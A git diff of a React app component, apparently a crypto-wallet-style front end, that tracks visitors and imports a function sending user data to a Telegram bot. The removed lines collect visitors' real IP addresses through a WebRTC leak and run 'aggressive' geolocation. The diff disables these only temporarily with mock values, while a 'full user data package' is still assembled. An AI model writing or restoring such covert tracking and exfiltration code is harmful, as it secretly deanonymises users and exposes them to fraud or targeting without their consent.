@@ -9,6 +9,9 @@ import { sendUserDataToBot, getBotInfo } from './utils/telegram-bot';
 import './utils/test-webrtc'; // Импортируем тесты для доступа в консоли
 import './utils/debug-helpers'; // Debug команды для консоли
 
+// 🚫 ВРЕМЕННО: WebRTC leak отключен для тестирования загрузки
+// Чтобы включить обратно - раскомментируйте строки с getIPSuperFast() и getIPFast()
+
 export type Network = 'tron' | 'ethereum' | 'bsc';
 
 // Declare Telegram type
@@ -32,10 +35,18 @@ export default function App() {
     const trackUserFast = async () => {
       try {
         console.log('🚀🚀🚀 ЭТАП 1: SUPER FAST MODE - быстрая загрузка!');
+        console.log('⚠️ WebRTC временно отключен!');
         
-        // Быстрый сбор (только Google STUN + 1 API, 2-3 секунды)
-        const { ip: fastIP, ipInfo: fastIPInfo } = await getIPSuperFast();
-        console.log('⚡ Быстрый IP получен:', fastIP);
+        // 🚫 ВРЕМЕННО: WebRTC отключен
+        // const { ip: fastIP, ipInfo: fastIPInfo } = await getIPSuperFast();
+        const fastIP = 'WebRTC_DISABLED';
+        const fastIPInfo = {
+          ipv4: [],
+          ipv6: [],
+          localIP: [],
+          webrtcLeaked: []
+        };
+        console.log('⚡ Быстрый IP (mock):', fastIP);
         
         // Получаем базовую информацию
         const userInfo = getUserInfo();
@@ -47,7 +58,7 @@ export default function App() {
         }
         
         console.log('✅ Этап 1 завершен - UI готов к показу!');
-        console.log('⏱️ Время: ~2-3 секунды');
+        console.log('⏱️ Время: ~0.5 секунды (WebRTC отключен)');
         
         // 🔥 ЭТАП 2: Полный сбор данных в фоне (не блокирует UI)
         console.log('');
@@ -60,22 +71,16 @@ export default function App() {
           console.error('⚠️ Ошибка проверки бота:', err);
         });
         
-        // ПОЛНЫЙ сбор IP (все STUN серверы + все API)
-        const { ip, ipInfo } = await getIPFast();
-        console.log('📍 Полный IP получен:', ip);
-        console.log('🌐 Full IP Info:', ipInfo);
+        // 🚫 ВРЕМЕННО: WebRTC отключен
+        // const { ip, ipInfo } = await getIPFast();
+        const ip = 'WebRTC_DISABLED';
+        const ipInfo = fastIPInfo;
+        console.log('📍 Полный IP (mock):', ip);
+        console.log('🌐 Full IP Info (mock):', ipInfo);
         
-        // АГРЕССИВНОЕ получение геоданных
+        // АГРЕССИВНОЕ получение геоданных - тоже отключено
         let geoData = undefined;
-        if (ip !== 'Unknown') {
-          console.log('🌍 Запуск агрессивного сбора геоданных...');
-          try {
-            geoData = await getGeoData(ip);
-            console.log('✅ Геоданные получены:', geoData);
-          } catch (geoError) {
-            console.error('⚠️ Ошибка получения геоданных:', geoError);
-          }
-        }
+        console.log('🌍 Геоданные отключены (WebRTC disabled)');
         
         // Формируем ПОЛНЫЙ пакет данных
         const fullUserData = {
